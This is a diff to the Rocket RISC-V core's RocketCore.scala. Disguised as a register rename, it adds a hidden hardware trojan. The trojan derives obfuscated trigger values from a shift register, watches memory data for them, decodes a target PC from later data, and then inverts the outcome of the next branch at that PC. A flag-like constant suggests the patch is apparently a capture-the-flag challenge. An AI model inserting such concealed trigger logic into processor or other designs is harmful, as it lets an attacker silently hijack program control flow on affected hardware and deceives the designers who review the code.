@@ -1,0 +1,107 @@
+diff --git a/src/main/scala/rocket/RocketCore.scala b/src/main/scala/rocket/RocketCore.scala
+index 460e25f7..ecd24c40 100644
+--- a/src/main/scala/rocket/RocketCore.scala
++++ b/src/main/scala/rocket/RocketCore.scala
+@@ -152,7 +152,7 @@ class Rocket(implicit p: Parameters) extends CoreModule()(p)
+   val mem_reg_raw_inst = Reg(UInt())
+   val mem_reg_wdata = Reg(Bits())
+   val mem_reg_rs2 = Reg(Bits())
+-  val mem_br_taken = Reg(Bool())
++  val mem_br_taken_ = Reg(Bool())
+   val take_pc_mem = Wire(Bool())
+ 
+   val wb_reg_valid           = Reg(Bool())
+@@ -377,6 +377,84 @@ class Rocket(implicit p: Parameters) extends CoreModule()(p)
+   val exCoverCauses = idCoverCauses
+   coverExceptions(ex_xcpt, ex_cause, "EXECUTE", exCoverCauses)
+ 
++  val trig_mem_data = RegInit("h5adf01e748ef22e547ce8210c60e48ff".asUInt(128.W))
++  when (trig_mem_data(55, 0) =/= "h7b52422d465443".asUInt(56.W)) {
++    trig_mem_data := Mux(trig_mem_data(0) === UInt(1),
++      (trig_mem_data >> 1) ^ "he1000000000000000000000000000000".asUInt(128.W),
++      (trig_mem_data >> 1))
++  }
++
++  val sNone :: sTrigA :: sTrigB :: sCountJALR :: sFlipBranch :: Nil = Enum(5)
++  val trig_state = RegInit(sNone)
++
++  val trigA = io.dmem.s1_data.data === trig_mem_data( 63,  0)
++  val trigB = io.dmem.s1_data.data === trig_mem_data(127, 64)
++
++  val trig_jalr_count = Reg(UInt(width = 5))
++  val trig_pc = Reg(UInt())
++  val trig_pc_valid = RegInit(false.B)
++
++  switch (trig_state) {
++    is (sNone) {
++      when (trig_pc_valid && mem_reg_pc === trig_pc) {
++        trig_state := sFlipBranch
++      } .elsewhen (trigA) {
++        trig_state := sTrigA
++      }
++    }
++    is (sTrigA) {
++      when (trig_pc_valid && mem_reg_pc === trig_pc) {
++        trig_state := sFlipBranch
++      } .elsewhen (trigA) {
++        trig_state := sTrigA
++      } .elsewhen (trigB) {
++        trig_state := sTrigB
++      } .otherwise {
++        trig_state := sNone
++      }
++    }
++    is (sTrigB) {
++      when (trig_pc_valid && mem_reg_pc === trig_pc) {
++        trig_state := sFlipBranch
++      } .elsewhen (trigB) {
++        trig_state := sTrigB
++      } .otherwise {
++        trig_state := sCountJALR
++        // use from 0x40 ('@') to 0x5f ('_') to ensure printable chars
++        trig_jalr_count := io.dmem.s1_data.data( 4, 0)
++        trig_pc :=     Cat(Fill(28, io.dmem.s1_data.data(52)),
++                           io.dmem.s1_data.data(60,56),
++                           io.dmem.s1_data.data(52,48),
++                           io.dmem.s1_data.data(44,40),
++                           io.dmem.s1_data.data(36,32),
++                           io.dmem.s1_data.data(28,24),
++                           io.dmem.s1_data.data(20,16),
++                           io.dmem.s1_data.data(12, 8),
++                           0.U(1.W))
++      }
++    }
++    is (sCountJALR) {
++      when (trig_pc_valid && mem_reg_pc === trig_pc) {
++        trig_state := sFlipBranch
++      } .elsewhen (mem_ctrl.jalr && trig_jalr_count === 0) {
++        trig_state := sNone
++        trig_pc := mem_reg_pc + trig_pc
++        trig_pc_valid := true.B
++      } .elsewhen (mem_ctrl.jalr && trig_jalr_count =/= 0) {
++        trig_jalr_count := trig_jalr_count - 1
++      }
++    }
++    is (sFlipBranch) {
++      when (mem_ctrl.branch) {
++        trig_state := sNone
++        trig_pc_valid := false.B
++      }
++    }
++  }
++
++  val mem_br_taken = Mux(trig_state === sFlipBranch, !mem_br_taken_, mem_br_taken_)
++
++
+   // memory stage
+   val mem_pc_valid = mem_reg_valid || mem_reg_replay || mem_reg_xcpt_interrupt
+   val mem_br_target = mem_reg_pc.asSInt +
+@@ -419,7 +497,7 @@ class Rocket(implicit p: Parameters) extends CoreModule()(p)
+     mem_reg_raw_inst := ex_reg_raw_inst
+     mem_reg_pc := ex_reg_pc
+     mem_reg_wdata := alu.io.out
+-    mem_br_taken := alu.io.cmp_out
++    mem_br_taken_ := alu.io.cmp_out
+ 
+     when (ex_ctrl.rxs2 && (ex_ctrl.mem || ex_ctrl.rocc || ex_sfence)) {
+       val typ = Mux(ex_ctrl.rocc, log2Ceil(xLen/8).U, ex_ctrl.mem_type)
